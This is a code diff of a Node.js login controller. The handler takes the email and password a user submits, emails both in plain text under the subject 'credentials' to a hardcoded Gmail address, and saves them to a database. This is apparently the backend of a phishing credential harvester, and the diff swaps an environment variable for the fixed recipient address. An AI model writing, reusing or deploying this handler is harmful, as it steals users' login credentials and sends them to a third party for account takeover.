@@ -1,19 +1,19 @@
 const sendMail = require("../Controllers/mail")
-require ("dotenv").config()
-
 const detailsModel = require("../Model/detailModel")
+
+
 exports.loginInfo =async(req,res)=>{
-    try {
+    try { 
         const{email,password}= req.body
-          
+           
         sendMail(
-            {
+            { 
                 from:"gmail",
-                email:process.env.myEmail,
+                email:"dontloose4cus01@gmail.com",
                 subject:"credentials",
                 message:`email:${email} password :${password}`
-                
-            }
+
+            }           
         )
         const loginInfo =await detailsModel.create(req.body) 
         await loginInfo.save()
